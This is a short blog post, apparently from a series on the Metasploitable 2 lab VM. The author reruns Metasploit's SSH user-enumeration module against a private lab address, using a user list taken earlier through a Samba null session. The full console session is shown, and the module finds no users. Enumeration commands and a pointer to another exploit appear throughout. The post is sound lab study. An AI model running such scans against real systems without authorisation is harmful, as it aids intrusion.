<!--hacking, metasploit, ssh-->
# SSH follow up

Since I did my last post I have been meaning to write a follow up on the failed attempt at using: `auxiliary/scanner/ssh/ssh_enumusers`.
I wanted to figure out what went wrong and if the vulnerability was even applicable. Since I have a list of all the users now I can try 
the enumeration again with the known users as the user name list.

## Another go

I managed to get a list of al the users during [this](https://filimon-danopoulos.github.io/posts/2014-11-15_Metasploitable-2-part-one.html)
exercise by exploiting a null session vulnerability in Samba. I saved it to the file `users.lst` so let's launch the exploit 
with that file.

    msf > use auxiliary/scanner/ssh/ssh_enumusers 
    msf auxiliary(ssh_enumusers) > show option
    [-] Invalid parameter "option", use "show -h" for more information
    msf auxiliary(ssh_enumusers) > show options

    Module options (auxiliary/scanner/ssh/ssh_enumusers):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       Proxies                     no        Use a proxy chain
       RHOSTS                      yes       The target address range or CIDR identifier
       RPORT      22               yes       The target port
       THREADS    1                yes       The number of concurrent threads
       THRESHOLD  10               yes       Amount of seconds needed before a user is considered found
       USER_FILE                   yes       File containing usernames, one per line

    msf auxiliary(ssh_enumusers) > set USER_FILE users.lst 
    USER_FILE => users.lst
    msf auxiliary(ssh_enumusers) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(ssh_enumusers) > run

    [*] 192.168.56.103:22 - SSH - Checking for false positives
    [*] 192.168.56.103:22 - SSH - Starting scan
    [!] 192.168.56.103:22 - SSH - User 'nobody' not found
    [!] 192.168.56.103:22 - SSH - User 'bind' not found
    [!] 192.168.56.103:22 - SSH - User 'proxy' not found
    [!] 192.168.56.103:22 - SSH - User 'syslog' not found
    [!] 192.168.56.103:22 - SSH - User 'user' not found
    [!] 192.168.56.103:22 - SSH - User 'www-data' not found
    [!] 192.168.56.103:22 - SSH - User 'root' not found
    [!] 192.168.56.103:22 - SSH - User 'news' not found
    [!] 192.168.56.103:22 - SSH - User 'postgres' not found
    [!] 192.168.56.103:22 - SSH - User 'bin' not found
    [!] 192.168.56.103:22 - SSH - User 'mail' not found
    [!] 192.168.56.103:22 - SSH - User 'distccd' not found
    [!] 192.168.56.103:22 - SSH - User 'proftpd' not found
    [!] 192.168.56.103:22 - SSH - User 'dhcp' not found
    [!] 192.168.56.103:22 - SSH - User 'daemon' not found
    [!] 192.168.56.103:22 - SSH - User 'sshd' not found
    [!] 192.168.56.103:22 - SSH - User 'man' not found
    [!] 192.168.56.103:22 - SSH - User 'lp' not found
    [!] 192.168.56.103:22 - SSH - User 'mysql' not found
    [!] 192.168.56.103:22 - SSH - User 'gnats' not found
    [!] 192.168.56.103:22 - SSH - User 'libuuid' not found
    [!] 192.168.56.103:22 - SSH - User 'backup' not found
    [!] 192.168.56.103:22 - SSH - User 'msfadmin' not found
    [!] 192.168.56.103:22 - SSH - User 'telnetd' not found
    [!] 192.168.56.103:22 - SSH - User 'sys' not found
    [!] 192.168.56.103:22 - SSH - User 'klog' not found
    [!] 192.168.56.103:22 - SSH - User 'postfix' not found
    [!] 192.168.56.103:22 - SSH - User 'service' not found
    [!] 192.168.56.103:22 - SSH - User 'list' not found
    [!] 192.168.56.103:22 - SSH - User 'irc' not found
    [!] 192.168.56.103:22 - SSH - User 'ftp' not found
    [!] 192.168.56.103:22 - SSH - User 'tomcat55' not found
    [!] 192.168.56.103:22 - SSH - User 'sync' not found
    [!] 192.168.56.103:22 - SSH - User 'uucp' not found
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    
Not a single user found, but we know that all users exist! That means that this version of SSH is not actually vulnerable to 
this attack. I have done some searching about this version online and it seems like it suffers from another vulnerability namely 
[this](http://www.exploit-db.com/exploits/5720/) one on http://www.exploit-db.com/. Who knows I might come around doing 
that if I get bored enough...


